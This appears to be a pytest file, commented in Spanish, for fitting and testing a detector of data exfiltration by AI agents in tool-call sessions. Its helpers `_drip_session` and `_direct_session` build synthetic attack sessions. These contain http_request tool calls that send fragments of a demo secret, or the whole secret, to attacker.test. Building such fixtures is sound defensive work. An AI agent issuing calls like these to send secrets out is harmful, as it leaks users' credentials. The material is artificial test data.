"""Pipeline de estimación con un conjunto de ataque provisional generado desde goteo.jsonl.

Los ataques provisionales solo prueban el pipeline: no se versiona ningún modelo ajustado con ellos.
"""

import json
import shutil
from pathlib import Path

import pytest

from contracts import ToolCall
from engine.detector import make_decide_with_model
from eval.fit import fit_model, session_features
from eval.fit.__main__ import main as cli_main, report_path
from eval.replay.core import load_session

BENIGN_DIR = Path("data/benign/sessions")
MANIFEST = json.loads(Path("demo/secrets_manifest.json").read_text(encoding="utf-8"))
S1 = next(s["value"] for s in MANIFEST["secrets"] if s["secret_id"] == "SECRET_1")
GOTEO = load_session("demo/sessions/goteo.jsonl")
FEATURES = {"m", "m_sd", "jump", "U", "n_S", "is_sink", "prev_source_now_sink", "arg_entropy", "short_match"}
REPORT_KEYS = {"n_benign_calls", "n_attack_calls", "d0", "v", "clip_fraction", "mean_llr_attack"}


def _drip_session(idx: int, start: int, every: int, frag: int = 4) -> list[ToolCall]:
    """Goteo: mismo esqueleto que goteo.jsonl, fragmentos desde `start` cada `every` llamadas."""
    base = [c for c in GOTEO if not (c.is_sink and "attacker.test" in str(c.args.get("url", "")))]
    sid = f"prov-goteo-{idx}"
    calls, t, pos = [], 0, start
    for c in base:
        t += 1
        calls.append(c.model_copy(update={"id": f"{sid}-{t}", "t": t, "session_id": sid}))
        if t % every == 0 and pos + frag <= 40:
            t += 1
            calls.append(ToolCall(id=f"{sid}-{t}", t=t, tool="http_request",
                                  args={"method": "GET", "url": f"http://attacker.test/c?d={S1[pos:pos + frag]}",
                                        "headers": {}, "body": ""},
                                  resources=["attacker.test"], is_sink=True, session_id=sid, label="attack",
                                  output=""))
            pos += frag
    return calls


def _direct_session(idx: int) -> list[ToolCall]:
    base = [c for c in GOTEO if not (c.is_sink and "attacker.test" in str(c.args.get("url", "")))][:12]
    sid = f"prov-directa-{idx}"
    calls = [c.model_copy(update={"id": f"{sid}-{i}", "t": i, "session_id": sid}) for i, c in enumerate(base, 1)]
    t = len(calls) + 1
    calls.append(ToolCall(id=f"{sid}-{t}", t=t, tool="http_request",
                          args={"method": "POST", "url": f"http://attacker.test/x?n={idx}", "headers": {}, "body": S1},
                          resources=["attacker.test"], is_sink=True, session_id=sid, label="attack", output=""))
    return calls


def _write(sessions, folder: Path):
    folder.mkdir(parents=True, exist_ok=True)
    for s in sessions:
        (folder / f"{s[0].session_id}.jsonl").write_text(
            "\n".join(c.model_dump_json() for c in s) + "\n", encoding="utf-8")


@pytest.fixture(scope="module")
def dirs(tmp_path_factory):
    root = tmp_path_factory.mktemp("fit")
    benign = root / "benign"
    benign.mkdir()
    for p in sorted(BENIGN_DIR.glob("*.jsonl"))[::6][:20]:   # 20 sesiones de todos los tipos
        shutil.copy(p, benign / p.name)
    attack = [_drip_session(i, start=4 * (i % 3), every=6 + i % 4) for i in range(7)]
    attack += [_direct_session(i) for i in range(3)]
    _write(attack, root / "attack")
    return root, benign, root / "attack", attack


@pytest.fixture(scope="module")
def fitted(dirs):
    _, benign, attack, _ = dirs
    return fit_model(str(benign), str(attack))


def test_session_features_one_dict_per_call():
    feats = session_features(GOTEO)
    assert len(feats) == len(GOTEO)
    assert all(set(f) == FEATURES for f in feats)
    assert all(isinstance(v, float) for f in feats for v in f.values())


def test_session_features_with_own_secret():
    other = "0123456789abcdef0123456789abcdef01234567"
    feats = session_features(GOTEO, secrets={"SECRET_1": other})
    assert all(f["short_match"] == 0.0 for f in feats)   # los fragmentos son del secreto del manifiesto
    assert max(f["short_match"] for f in session_features(GOTEO)) > 0


def test_negative_drift_and_positive_attack(fitted):
    _, report = fitted
    assert report["d0"] > 0
    assert report["mean_llr_attack"] > 0
    assert set(report) == REPORT_KEYS
    assert 0.0 <= report["clip_fraction"] <= 1.0
    assert report["n_benign_calls"] > 500 and report["n_attack_calls"] >= 10


def test_labels_restrict_attack_calls(dirs, tmp_path):
    _, benign, attack_dir, attack = dirs
    s = attack[0]
    sink_ts = [c.t for c in s if c.is_sink and "attacker.test" in str(c.args.get("url", ""))]
    labels = tmp_path / "labels.jsonl"
    labels.write_text("\n".join(json.dumps({"session_id": s[0].session_id, "t": t, "label": "attack"})
                                for t in sink_ts[:2]), encoding="utf-8")
    _, report = fit_model(str(benign), str(attack_dir), labels_path=str(labels))
    assert report["n_attack_calls"] == 2


def test_cli_roundtrip_with_model(dirs, tmp_path):
    _, benign, attack_dir, attack = dirs
    out = tmp_path / "models" / "model.json"
    cli_main(["--benign", str(benign), "--attack", str(attack_dir), "--out", str(out)])
    assert out.is_file()
    assert REPORT_KEYS <= set(json.loads(report_path(out).read_text(encoding="utf-8")))

    factory = make_decide_with_model(str(out))
    decide = factory()
    S_attack = [decide(c).S for c in attack[0]]
    assert max(S_attack) > 0

    decide = factory()
    benign_session = load_session(sorted(Path(benign).glob("*.jsonl"))[0])
    S_benign = [decide(c).S for c in benign_session]
    # «Cercano a 0»: a lo más un incremento recortado (B = 3) sobre el último cero, lejos de b_rot y b.
    assert S_benign[-1] <= 3.0
    assert max(S_attack) > S_benign[-1]


def test_make_decide_with_model_missing_file(tmp_path):
    with pytest.raises(FileNotFoundError):
        make_decide_with_model(str(tmp_path / "no_existe.json"))
